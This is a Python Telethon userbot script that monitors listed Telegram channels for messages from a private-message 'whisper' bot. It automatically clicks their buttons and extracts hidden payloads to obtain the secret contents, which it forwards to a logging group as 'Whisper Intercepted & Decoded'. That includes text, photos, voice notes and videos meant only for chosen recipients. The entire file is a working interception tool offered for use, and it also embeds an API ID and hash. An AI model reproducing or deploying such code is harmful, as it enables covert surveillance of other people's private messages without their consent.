import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780
]

WHISPER_BOT_ID = 518335359 # @PsstRobot
LOG_GROUP_ID = -1004402300724

# Global context for media whispers
ctx = {"title": "Target Channel", "link": "#", "time": 0}

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== 1. CHANNEL MONITOR (AUTO-TAP) ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def channel_handler(event):
    if not event.buttons:
        return

    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target Channel"
    print(f"\n🔍 WHISPER DETECTED in [{chat_name}]")

    # Link Generation
    try:
        chat = await event.get_chat()
        msg_link = f"https://t.me/{chat.username}/{event.id}" if getattr(chat, 'username', None) else f"https://t.me/c/{str(event.chat_id).replace('-100','')}/{event.id}"
    except: msg_link = "#"

    try:
        payload = None
        
        # --- PHASE 1: Scan Buttons for URL Deep Links ---
        for row in event.buttons:
            for btn in row:
                if btn.url and 'PsstRobot?start=' in btn.url:
                    payload = btn.url.split('start=')[-1]
                    print(f"✅ Found Payload in URL Button: {payload}")
        
        # --- PHASE 2: Force Click Popup (For Short Text or Hidden Key) ---
        print("🖱️ Clicking button for response...")
        res = await event.click(0)
        
        popup_text = ""
        if hasattr(res, 'message') and res.message:
            popup_text = res.message
        elif isinstance(res, str):
            popup_text = res

        # Check if popup has the secret payload (-wh::...)
        if popup_text and "-wh::" in popup_text:
            match = re.search(r"-wh::[a-zA-Z0-9_=]+", popup_text)
            if match:
                payload = match.group(0)
                print(f"✅ Found Payload in Popup Text: {payload}")

        # --- PHASE 3: Auto-Trigger Advanced Whisper ---
        if payload or "advanced" in popup_text.lower():
            print(f"🚀 Triggering Bot DM for Advanced Content...")
            ctx.update({"title": chat_name, "link": msg_link, "time": start_time})
            
            # Send payload to bot to simulate manual tap
            if payload:
                await client.send_message(WHISPER_BOT_ID, f"/start {payload}")
            else:
                # If no payload found but it's advanced, try basic /start
                await client.send_message(WHISPER_BOT_ID, "/start")
            
        elif popup_text:
            # Normal Short Whisper Success
            elapsed = round((time.perf_counter() - start_time) * 1000, 2)
            log = (
                f"🔓 **Whisper Intercepted & Decoded!**\n\n"
                f"📝 **Secret Message:**\n{popup_text}\n\n"
                f"📍 **Channel:** {chat_name}\n"
                f"⚡ **Speed:** {elapsed} ms\n"
                f"🔗 [Message Link]({msg_link})"
            )
            await client.send_message(LOG_GROUP_ID, log)
            print(f"✅ Short Whisper Forwarded ({elapsed}ms)")

    except Exception as e:
        print(f"❌ Error in Channel Handler: {e}")

# ==================== 2. BOT DM MONITOR (MEDIA REDIRECT) ====================
@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    # Ignore Bot Setup messages
    if event.message.text and any(x in event.message.text for x in ["Preparing", "Everyone", "Click the button", "/start"]):
        # Special case: check if bot sent a button in DM that needs clicking
        if event.buttons:
            print("🖱️ Found button in Bot DM, clicking 'START'...")
            await event.click(0)
        return

    print(f"📩 MEDIA/LONG MESSAGE RECEIVED FROM BOT DM!")

    try:
        now = time.perf_counter()
        # Fallback context if needed
        if now - ctx["time"] > 60: ctx["time"] = now 
        
        elapsed = round((now - ctx["time"]) * 1000, 2)
        
        m_type = "Advanced Whisper"
        if event.photo: m_type = "Photo"
        elif event.voice: m_type = "Voice Note"
        elif event.video: m_type = "Video"
        
        log = (
            f"🔓 **Whisper Intercepted & Decoded!**\n\n"
            f"📝 **Secret Message:**\n[Advanced {m_type}]\n"
            f"{event.message.text if event.message.text else ''}\n\n"
            f"📍 **Channel:** {ctx['title']}\n"
            f"⚡ **Speed:** {elapsed} ms\n"
            f"🔗 [Message Link]({ctx['link']})"
        )

        # Send Media + Caption to Group
        await client.send_message(LOG_GROUP_ID, log, file=event.message.media if event.message.media else None)
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Advanced Media/Long Text redirected successfully!")

    except Exception as e:
        print(f"❌ DM Redirect Error: {e}")

# ==================== WEB SERVER & STARTUP ====================
async def handle_ping(request): return web.Response(text="Bot Active")
async def main():
    await client.start()
    
    # Render port binding fix
    port = int(os.environ.get("PORT", 10000))
    app = web.Application(); app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", port).start()
    
    await client.get_dialogs()
    try:
        await client.send_message(LOG_GROUP_ID, "🚀 **Whisper Automator Pro-Engine Live!**")
        print("🟢 Bot Online and Listening...")
    except: pass
    
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
